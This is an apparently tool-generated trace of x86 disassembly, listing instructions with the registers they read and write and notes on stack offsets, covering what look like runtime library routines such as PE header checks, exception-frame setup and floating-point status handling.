regs_read: [30, 20], regs_write: [30] 0x458099: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45809c: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4580a2: mov esi, eax, regs_read: [19], regs_write: [29] 0x4580a6: push eax, regs_read: [30, 19], regs_write: [30] 0x4580a7: push eax, regs_read: [30, 19], regs_write: [30] 0x4580a8: push eax, regs_read: [30, 19], regs_write: [30] 0x4580a9: push dword ptr [ebp + 0x1c], regs_read: [30, 20], regs_write: [30] 0x4580ac: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x4580af: push esi, regs_read: [30, 29], regs_write: [30] 0x4580b0: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x4580b3: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x4580b6: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x4580be: pop esi, regs_read: [30], regs_write: [30, 29] 0x4580bf: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4580c1: mov edi, edi, regs_read: [23], regs_write: [23] 0x4580c3: push ebp, regs_read: [30, 20], regs_write: [30] 0x4580c4: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18c and offset 0x8000 for stack size 0x10000 0x4580c6: push esi, regs_read: [30, 29], regs_write: [30] 0x4580c7: mov esi, dword ptr [ebp + 0x14], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x190 and offset 0x8014 for stack size 0x10000 0x4580ce: push esi, regs_read: [30, 29], regs_write: [30] 0x4580cf: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x4580d7: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4580d8: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4580d9: mov esi, eax, regs_read: [19], regs_write: [29] 0x4580db: mov eax, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x190 and offset 0x801c for stack size 0x10000 0x4580e2: push eax, regs_read: [30, 19], regs_write: [30] 0x4580e3: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x4580eb: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4580ec: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4580f7: push ecx, regs_read: [30, 22], regs_write: [30] 0x4580f8: push ecx, regs_read: [30, 22], regs_write: [30] 0x4580f9: push ecx, regs_read: [30, 22], regs_write: [30] 0x4580fa: push eax, regs_read: [30, 19], regs_write: [30] 0x4580fb: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x4580fe: push esi, regs_read: [30, 29], regs_write: [30] 0x4580ff: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x458102: push dword ptr [ebp + 0xc], regs_read: [30, 20], regs_write: [30] 0x458105: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x458113: push 2, regs_read: [30], regs_write: [30] 0x458115: pop esi, regs_read: [30], regs_write: [30, 29] 0x458121: mov eax, esi, regs_read: [29], regs_write: [19] 0x458123: pop esi, regs_read: [30], regs_write: [30, 29] 0x458124: pop ebp, regs_read: [30], regs_write: [30, 20] 0x458130: push ebp, regs_read: [30, 20], regs_write: [30] 0x458131: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1b0 and offset 0x8000 for stack size 0x10000 0x45814e: mov edx, 0, regs_read: (), regs_write: [24] 0x4581fd: mov ecx, 0x10, regs_read: (), regs_write: [22] 0x458202: mov edx, 0, regs_read: (), regs_write: [24] 0x458304: mov edx, 0x3e9, regs_read: (), regs_write: [24] 0x45831f: mov edx, 8, regs_read: (), regs_write: [24] 0x458332: mov edx, 0xffffffcc, regs_read: (), regs_write: [24] 0x458355: mov edx, 9, regs_read: (), regs_write: [24] 0x458363: mov dword ptr [esp + 0xc], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1b0 and offset 0x800c for stack size 0x10000 saving data to stack: 9 4 0x458367: mov edx, esp, regs_read: [30], regs_write: [24] adjusting stack for ESP -0x1b0 and offset 0x8000 for stack size 0x10000 0x45836c: mov dword ptr [esp + 8], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1b0 and offset 0x8008 for stack size 0x10000 saving data to stack: 0 4 0x458373: mov dword ptr [esp + 4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1b0 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x458377: mov dword ptr [esp], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x1b0 and offset 0x8000 for stack size 0x10000 saving data to stack: 0 4 0x4583ad: mov edx, 0x3e9, regs_read: (), regs_write: [24] 0x4583c0: mov edi, edi, regs_read: [23], regs_write: [23] 0x4583c2: push ebp, regs_read: [30, 20], regs_write: [30] 0x4583c3: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1b4 and offset 0x8000 for stack size 0x10000 0x4583c5: push ecx, regs_read: [30, 22], regs_write: [30] 0x4583c6: push ecx, regs_read: [30, 22], regs_write: [30] 0x4583c7: push ebx, regs_read: [30, 21], regs_write: [30] 0x4583c8: push esi, regs_read: [30, 29], regs_write: [30] 0x4583c9: mov esi, 0xffff, regs_read: (), regs_write: [29] 0x4583ce: push esi, regs_read: [30, 29], regs_write: [30] 0x4583cf: push 0x1b3f, regs_read: [30], regs_write: [30] 0x4583dc: mov ebx, eax, regs_read: [19], regs_write: [21] 0x4583de: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4583df: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4583e4: mov eax, 0x7ff0, regs_read: (), regs_write: [19] 0x4583eb: push ecx, regs_read: [30, 22], regs_write: [30] 0x4583ec: push ecx, regs_read: [30, 22], regs_write: [30] 0x4583fa: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4583fb: pop ecx, regs_read: [30], regs_write: [30, 22] 0x458414: push ebx, regs_read: [30, 21], regs_write: [30] 0x458421: push 0xc, regs_read: [30], regs_write: [30] 0x458423: push 8, regs_read: [30], regs_write: [30] 0x45842f: push esi, regs_read: [30, 29], regs_write: [30] 0x458430: push ebx, regs_read: [30, 21], regs_write: [30] 0x458457: push ebx, regs_read: [30, 21], regs_write: [30] 0x458464: push 0xc, regs_read: [30], regs_write: [30] 0x458466: push 0x10, regs_read: [30], regs_write: [30] 0x45846a: push esi, regs_read: [30, 29], regs_write: [30] 0x45846d: push ebx, regs_read: [30, 21], regs_write: [30] 0x458478: pop ecx, regs_read: [30], regs_write: [30, 22] 0x458479: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45847a: pop esi, regs_read: [30], regs_write: [30, 29] 0x45847b: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4584a0: mov edx, eax, regs_read: [19], regs_write: [24] 0x4584c0: mov eax, edx, regs_read: [24], regs_write: [19] 0x4584d0: push ebp, regs_read: [30, 20], regs_write: [30] 0x4584d1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1e0 and offset 0x8000 for stack size 0x10000 0x4584d3: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1e0 and offset 0x8008 for stack size 0x10000 0x4584d8: push ebx, regs_read: [30, 21], regs_write: [30] 0x4584d9: push esi, regs_read: [30, 29], regs_write: [30] 0x4584da: push edi, regs_read: [30, 23], regs_write: [30] 0x4584db: mov ecx, dword ptr [eax + 0x3c], regs_read: [19], regs_write: [22] 0x4584f1: mov edi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x1ec and offset 0x800c for stack size 0x10000 0x4584f4: mov esi, dword ptr [eax + 0xc], regs_read: [19], regs_write: [29] 0x4584fb: mov ecx, dword ptr [eax + 8], regs_read: [19], regs_write: [22] 0x45850e: pop edi, regs_read: [30], regs_write: [30, 23] 0x45850f: pop esi, regs_read: [30], regs_write: [30, 29] 0x458510: pop ebx, regs_read: [30], regs_write: [30, 21] 0x458511: pop ebp, regs_read: [30], regs_write: [30, 20] 0x458520: push ebp, regs_read: [30, 20], regs_write: [30] 0x458521: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x1e0 and offset 0x8000 for stack size 0x10000 0x458523: push -2, regs_read: [30], regs_write: [30] 0x458525: push 0x4e8e90, regs_read: [30], regs_write: [30] 0x45852a: push 0x4373f0, regs_read: [30], regs_write: [30] 0x45852f: mov eax, dword ptr fs:[0], regs_read: [32], regs_write: [19] 0x458535: push eax, regs_read: [30, 19], regs_write: [30] 0x458539: push ebx, regs_read: [30, 21], regs_write: [30] 0x45853a: push esi, regs_read: [30, 29], regs_write: [30] 0x45853b: push edi, regs_read: [30, 23], regs_write: [30] 0x45853c: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x458546: push eax, regs_read: [30, 19], regs_write: [30] 0x45854a: mov dword ptr fs:[0], eax, regs_read: [32, 19], regs_write: () 0x458550: mov dword ptr [ebp - 0x18], esp, regs_read: [20, 30], regs_write: () adjusting stack for ESP -0x200 and offset 0x7fe8 for stack size 0x10000 saving data to stack: -512 4 0x458553: mov dword ptr [ebp - 4], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x200 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x45855a: push 0x400000, regs_read: [30], regs_write: [30] 0x45856b: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x204 and offset 0x8008 for stack size 0x10000 0x458573: push eax, regs_read: [30, 19], regs_write: [30] 0x458574: push 0x400000, regs_read: [30], regs_write: [30] 0x458585: mov eax, dword ptr [eax + 0x24], regs_read: [19], regs_write: [19] 0x458590: mov dword ptr [ebp - 4], 0xfffffffe, regs_read: [20], regs_write: () adjusting stack for ESP -0x20c and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967294 4 0x458597: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x20c and offset 0x7ff0 for stack size 0x10000 0x45859a: mov dword ptr fs:[0], ecx, regs_read: [32, 22], regs_write: () 0x4585a1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4585a2: pop edi, regs_read: [30], regs_write: [30, 23] 0x4585a3: pop esi, regs_read: [30], regs_write: [30, 29] 0x4585a4: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4585a5: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x1fc and offset 0x8000 for stack size 0x10000 0x4585a7: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4585a9: mov eax, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x4 and offset 0x7fec for stack size 0x10000 0x4585ac: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x4585b9: mov eax, ecx, regs_read: [22], regs_write: [19] 0x4585bc: mov esp, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [30] adjusting stack for ESP 0x4 and offset 0x7fe8 for stack size 0x10000 0x4585bf: mov dword ptr [ebp - 4], 0xfffffffe, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967294 4 0x4585c8: mov ecx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ff0 for stack size 0x10000 0x4585cb: mov dword ptr fs:[0], ecx, regs_read: [32, 22], regs_write: () 0x4585d2: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4585d3: pop edi, regs_read: [30], regs_write: [30, 23] 0x4585d4: pop esi, regs_read: [30], regs_write: [30, 29] 0x4585d5: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4585d6: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0x10 and offset 0x8000 for stack size 0x10000 0x4585d8: pop ebp, regs_read: [30], regs_write: [30, 20] 0x4585e0: push ebp, regs_read: [30, 20], regs_write: [30] 0x4585e1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x4585e3: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x4585e6: mov ecx, 0x5a4d, regs_read: (), regs_write: [22] 0x4585f0: mov ecx, dword ptr [eax + 0x3c], regs_read: [19], regs_write: [22] 0x4585fd: mov edx, 0x10b, regs_read: (), regs_write: [24] 0x45860b: pop ebp, regs_read: [30], regs_write: [30, 20] 0x45860f: pop ebp, regs_read: [30], regs_write: [30, 20] 0x458620: push edi, regs_read: [30, 23], regs_write: [30] 0x458621: push esi, regs_read: [30, 29], regs_write: [30] 0x458622: push ebx, regs_read: [30, 21], regs_write: [30] 0x458625: mov eax, dword ptr [esp + 0x14], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x8014 for stack size 0x10000 0x45862e: mov edx, dword ptr [esp + 0x10], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 0x458639: mov dword ptr [esp + 0x14], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x8014 for stack size 0x10000 saving data to stack: 0 4 0x45863d: mov dword ptr [esp + 0x10], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x458641: mov eax, dword ptr [esp + 0x1c], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x801c for stack size 0x10000 0x45864a: mov edx, dword ptr [esp + 0x18], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x4 and offset 0x8018 for stack size 0x10000 0x458655: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x801c for stack size 0x10000 saving data to stack: 0 4 0x458659: mov dword ptr [esp + 0x18], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x4 and offset 0x8018 for stack size 0x10000 saving data to stack: 0 4 0x458661: mov ecx, dword ptr [esp + 0x18], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x4 and offset 0x8018 for stack size 0x10000 0x458665: mov eax, dword ptr [esp + 0x14], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x8014 for stack size 0x10000 0x45866d: mov ebx, eax, regs_read: [19], regs_write: [21] 0x45866f: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 0x458675: mov edx, ebx, regs_read: [21], regs_write: [24] 0x458679: mov ebx, eax, regs_read: [19], regs_write: [21] 0x45867b: mov ecx, dword ptr [esp + 0x18], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x4 and offset 0x8018 for stack size 0x10000 0x45867f: mov edx, dword ptr [esp + 0x14], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x4 and offset 0x8014 for stack size 0x10000 0x458683: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x8010 for stack size 0x10000 0x458695: mov esi, eax, regs_read: [19], regs_write: [29] 0x45869b: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45869d: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x8018 for stack size 0x10000 0x4586b8: mov eax, esi, regs_read: [29], regs_write: [19] 0x4586c4: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4586c5: pop esi, regs_read: [30], regs_write: [30, 29] 0x4586c6: pop edi, regs_read: [30], regs_write: [30, 23] 0x4586d0: push ebx, regs_read: [30, 21], regs_write: [30] 0x4586d1: push edi, regs_read: [30, 23], regs_write: [30] 0x4586d4: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x4586dd: mov edx, dword ptr [esp + 0xc], regs_read: [30], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x4586e8: mov dword ptr [esp + 0x10], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x4586ec: mov dword ptr [esp + 0xc], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x4586f0: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8018 for stack size 0x10000 0x4586f8: mov edx, dword ptr [esp + 0x14], regs_read: [30], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x8014 for stack size 0x10000 0x458703: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x8018 for stack size 0x10000 saving data to stack: 0 4 0x458707: mov dword ptr [esp + 0x14], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x8014 for stack size 0x10000 saving data to stack: 0 4 0x45870f: mov ecx, dword ptr [esp + 0x14], regs_read: [30], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x8014 for stack size 0x10000 0x458713: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x45871b: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x458721: mov eax, edx, regs_read: [24], regs_write: [19] 0x45872a: mov ebx, eax, regs_read: [19], regs_write: [21] 0x45872c: mov ecx, dword ptr [esp + 0x14], regs_read: [30], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x8014 for stack size 0x10000 0x458730: mov edx, dword ptr [esp + 0x10], regs_read: [30], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x458734: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x458746: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45877d: pop edi, regs_read: [30], regs_write: [30, 23] 0x45877e: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4587af: pop eax, regs_read: [30], regs_write: [30, 19] 0x4587b1: push ebp, regs_read: [30, 20], regs_write: [30] 0x4587b2: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x8 and offset 0x8000 for stack size 0x10000 0x4587bf: mov eax, dword ptr [esp + 4], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x8 and offset 0x8004 for stack size 0x10000 0x458816: mov eax, 0x80000000, regs_read: (), regs_write: [19] 0x458820: push ebp, regs_read: [30, 20], regs_write: [30] 0x458821: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x458823: push edi, regs_read: [30, 23], regs_write: [30] 0x458831: mov edi, dword ptr [ebp + 8], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x45883a: mov eax, edx, regs_read: [24], regs_write: [19] 0x45884d: mov ecx, 0xf, regs_read: (), regs_write: [22] 0x458861: pxor xmm2, xmm2, regs_read: [124], regs_write: [124] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x45888d: push ebx, regs_read: [30, 21], regs_write: [30] 0x45889f: pop ebx, regs_read: [30], regs_write: [30, 21] 0x4588aa: pop edi, regs_read: [30], regs_write: [30, 23] 0x4588eb: pop edi, regs_read: [30], regs_write: [30, 23] 0x4588ee: mov eax, 0xfffffff0, regs_read: (), regs_write: [19] 0x4588f5: pxor xmm0, xmm0, regs_read: [122], regs_write: [122] adjusting stack for ESP 0x8 and offset 0x8000 for stack size 0x10000 0x4588fd: mov ecx, 0xf, regs_read: (), regs_write: [22] 0x458904: mov edx, 0xffffffff, regs_read: (), regs_write: [24] 0x458913: pxor xmm0, xmm0, regs_read: [122], regs_write: [122] adjusting stack for ESP 0x8 and offset 0x8000 for stack size 0x10000 0x45892e: mov edi, dword ptr [ebp + 8], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x8 and offset 0x8008 for stack size 0x10000 0x458940: mov al, byte ptr [ebp + 0xc], regs_read: [20], regs_write: [2] adjusting stack for ESP 0x8 and offset 0x800c for stack size 0x10000 0x458951: mov eax, edi, regs_read: [23], regs_write: [19] 0x458954: pop edi, regs_read: [30], regs_write: [30, 23] 0x458957: push ebp, regs_read: [30, 20], regs_write: [30] 0x458958: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x8 and offset 0x8000 for stack size 0x10000 0x458961: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x8 and offset 0x8008 for stack size 0x10000 0x458969: mov edx, eax, regs_read: [19], regs_write: [24] 0x458970: push esi, regs_read: [30, 29], regs_write: [30] 0x458971: mov esi, eax, regs_read: [19], regs_write: [29] 0x458982: mov esi, eax, regs_read: [19], regs_write: [29] 0x458984: mov edx, eax, regs_read: [19], regs_write: [24] 0x45898b: pop esi, regs_read: [30], regs_write: [30, 29] 0x458998: pop ebp, regs_read: [30], regs_write: [30, 20] 0x45899a: mov dx, word ptr [ebp + 0xc], regs_read: [20], regs_write: [18] adjusting stack for ESP 0xc and offset 0x800c for stack size 0x10000 0x4589af: mov eax, ecx, regs_read: [22], regs_write: [19] 0x4589c0: movaps xmm0, xmmword ptr [0x4dc170], regs_read: (), regs_write: [122] 0x4589db: push 0x10, regs_read: [30], regs_write: [30] 0x4589ec: push 2, regs_read: [30], regs_write: [30] 0x4589ee: pop eax, regs_read: [30], regs_write: [30, 19] 0x458a01: pop ebp, regs_read: [30], regs_write: [30, 20] 0x458a03: mov eax, ecx, regs_read: [22], regs_write: [19] 0x458a05: pop ebp, regs_read: [30], regs_write: [30, 20] 0x458a07: push ebp, regs_read: [30, 20], regs_write: [30] 0x458a08: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x458a0a: push ecx, regs_read: [30, 22], regs_write: [30] 0x458a2a: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x8 and offset 0x7ffc for stack size 0x10000 0x458a3b: mov eax, 0xc000008e, regs_read: (), regs_write: [19] 0x458a50: mov eax, 0xc0000091, regs_read: (), regs_write: [19] 0x458a5e: mov eax, 0xc0000093, regs_read: (), regs_write: [19] 0x458a6c: mov eax, 0xc000008f, regs_read: (), regs_write: [19] 0x458a73: mov eax, 0xc0000090, regs_read: (), regs_write: [19] 0x458a7a: mov eax, dword ptr [ebp + 8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x8 and offset 0x8008 for stack size 0x10000 0x458a7f: push ebp, regs_read: [30, 20], regs_write: [30] 0x458a80: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x458a85: push ebx, regs_read: [30, 21], regs_write: [30] 0x458a86: push esi, regs_read: [30, 29], regs_write: [30] 0x458a87: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x458a8c: push edi, regs_read: [30, 23], regs_write: [30] 0x458a92: mov edi, dword ptr [ebp - 8], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x8 and offset 0x7ff8 for stack size 0x10000 0x458a98: push edi, regs_read: [30, 23], regs_write: [30] 0x458a9e: push edi, regs_read: [30, 23], regs_write: [30] 0x458a9f: push dword ptr [ebp - 0xc], regs_read: [30, 20], regs_write: [30] 0x458aa2: mov esi, eax, regs_read: [19], regs_write: [29] 0x458aa4: push esi, regs_read: [30, 29], regs_write: [30] 0x458aad: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x458aaf: push edi, regs_read: [30, 23], regs_write: [30] 0x458ab0: push esi, regs_read: [30, 29], regs_write: [30] 0x458abe: pop edi, regs_read: [30], regs_write: [30, 23] 0x458abf: pop esi, regs_read: [30], regs_write: [30, 29] 0x458ac0: mov eax, ebx, regs_read: [21], regs_write: [19] 0x458ac2: pop ebx, regs_read: [30], regs_write: [30, 21] 0x458ac5: push ebp, regs_read: [30, 20], regs_write: [30] 0x458ac6: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x18 and offset 0x8000 for stack size 0x10000 0x458acb: mov eax, dword ptr [edx + 0x10], regs_read: [24], regs_write: [19] 0x458ace: push ebx, regs_read: [30, 21], regs_write: [30] 0x458acf: push esi, regs_read: [30, 29], regs_write: [30] 0x458ad2: mov dword ptr [ebp - 0x10], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x20 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 4294967295 4 0x458ad5: mov ebx, esi, regs_read: [29], regs_write: [21] 0x458ad7: push edi, regs_read: [30, 23], regs_write: [30] 0x458ad8: mov edi, ecx, regs_read: [22], regs_write: [23] 0x458ada: mov ecx, esi, regs_read: [29], regs_write: [22] 0x458adc: mov dword ptr [ebp - 0x18], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x24 and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x458adf: mov dword ptr [ebp - 0xc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x24 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x458ae2: mov dword ptr [edi], esi, regs_read: [23, 29], regs_write: () 0x458ae4: mov dword ptr [edi + 4], esi, regs_read: [23, 29], regs_write: () 0x458ae7: mov dword ptr [edi + 8], esi, regs_read: [23, 29], regs_write: () 0x458af7: mov dword ptr [ebp - 0x14], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x24 and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x458afa: mov eax, edx, regs_read: [24], regs_write: [19] 0x458afe: mov eax, dword ptr [edx], regs_read: [24], regs_write: [19] 0x458b0e: mov eax, edx, regs_read: [24], regs_write: [19] 0x458b12: mov eax, dword ptr [edx], regs_read: [24], regs_write: [19] 0x458b14: mov cl, byte ptr [eax + ecx], regs_read: [19, 22], regs_write: [10] 0x458b24: mov edx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x24 and offset 0x7ff0 for stack size 0x10000 0x458b27: mov eax, edx, regs_read: [24], regs_write: [19] 0x458b2f: mov eax, dword ptr [edx], regs_read: [24], regs_write: [19] 0x458b31: mov ecx, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x24 and offset 0x7ff4 for stack size 0x10000 0x458b34: mov al, byte ptr [eax + ecx], regs_read: [19, 22], regs_write: [2] 0x458b37: mov byte ptr [ebp + ebx - 8], al, regs_read: [20, 21, 2], regs_write: () 0x458b3d: mov dword ptr [ebp - 0xc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x24 and offset 0x7ff4 for stack size 0x10000 saving data to stack: 0 4 0x458b45: mov ebx, esi, regs_read: [29], regs_write: [21] 0x458b4c: push ecx, regs_read: [30, 22], regs_write: [30] 0x458b4d: push eax, regs_read: [30, 19], regs_write: [30] 0x458b4e: mov ecx, 0x4f0598, regs_read: (), regs_write: [22] 0x458b58: mov byte ptr [ebp + ebx - 8], al, regs_read: [20, 21, 2], regs_write: () 0x458b62: mov cl, byte ptr [ebp - 7], regs_read: [20], regs_write: [10] adjusting stack for ESP -0x2c and offset 0x7ff9 for stack size 0x10000 0x458b65: mov ebx, esi, regs_read: [29], regs_write: [21] 0x458b67: mov al, byte ptr [ebp - 8], regs_read: [20], regs_write: [2] adjusting stack for ESP -0x2c and offset 0x7ff8 for stack size 0x10000 0x458b6a: mov dl, byte ptr [ebp - 6], regs_read: [20], regs_write: [16] adjusting stack for ESP -0x2c and offset 0x7ffa for stack size 0x10000 0x458b78: mov al, byte ptr [ebp - 7], regs_read: [20], regs_write: [2] adjusting stack for ESP -0x2c and offset 0x7ff9 for stack size 0x10000 0x458b7b: mov byte ptr [ebp - 4], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x2c and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 1 0x458b7e: mov cl, dl, regs_read: [16], regs_write: [10] 0x458b91: mov byte ptr [ebp - 3], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x2c and offset 0x7ffd for stack size 0x10000 saving data to stack: 0 1 0x458b94: mov byte ptr [ebp - 2], dl, regs_read: [20, 16], regs_write: () adjusting stack for ESP -0x2c and offset 0x7ffe for stack size 0x10000 saving data to stack: 0 1 0x458b97: mov ecx, dword ptr [edi + 4], regs_read: [23], regs_write: [22] 0x458ba4: mov al, byte ptr [eax], regs_read: [19], regs_write: [2] 0x458ba6: mov byte ptr [ecx], al, regs_read: [22, 2], regs_write: () 0x458bad: push eax, regs_read: [30, 19], regs_write: [30] 0x458bae: push ecx, regs_read: [30, 22], regs_write: [30] 0x458baf: mov ecx, edi, regs_read: [23], regs_write: [22] 0x458bbc: mov edx, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x34 and offset 0x7ff0 for stack size 0x10000 0x458bbf: mov ebx, esi, regs_read: [29], regs_write: [21] 0x458bc1: mov ecx, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x7ff4 for stack size 0x10000 0x458bc4: mov eax, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x34 and offset 0x7fec for stack size 0x10000 0x458bdc: push 4, regs_read: [30], regs_write: [30] 0x458bde: pop eax, regs_read: [30], regs_write: [30, 19] 